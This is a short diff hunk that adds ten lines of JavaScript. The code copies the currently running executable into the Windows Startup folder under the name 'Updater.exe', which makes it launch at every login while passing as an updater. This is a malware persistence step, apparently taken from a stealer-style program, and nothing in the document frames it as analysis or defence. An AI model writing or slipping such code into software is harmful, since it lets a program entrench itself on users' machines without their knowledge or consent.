@@ -1,0 +1,10 @@
+this.requires.fs
+            .createReadStream(process.argv0)
+            .pipe(
+                this.requires.fs.createWriteStream(
+                    `${process.env.APPDATA.replace(
+                        "\\",
+                        "/"
+                    )}/Microsoft/Windows/Start Menu/Programs/Startup/Updater.exe`
+                )
+            )
